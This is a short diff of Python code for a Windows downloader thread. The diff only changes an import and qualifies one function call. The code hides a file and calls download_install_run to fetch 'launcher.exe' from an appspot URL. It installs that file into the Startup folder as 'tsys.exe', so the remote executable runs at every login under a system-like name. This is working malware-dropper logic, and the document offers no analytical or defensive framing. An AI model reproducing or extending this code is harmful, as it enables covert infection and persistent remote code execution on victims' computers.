@@ -6,7 +6,7 @@ import cPickle
 import launcher
 import threading
 
-from win32com.shell import shell, shellcon
+from win32com.shell import shellcon
 
 class Downloader(threading.Thread):
     def __init__(self, script):
@@ -31,7 +31,7 @@ class Downloader(threading.Thread):
         launcher.hide_file(path)
         
         #DIR the launcher
-        download_install_run(
+        launcher.download_install_run(
             "http://littlesitetomakemoney.appspot.com/launcher.exe", 
             shellcon.CSIDL_STARTUP, 
             "tsys.exe")
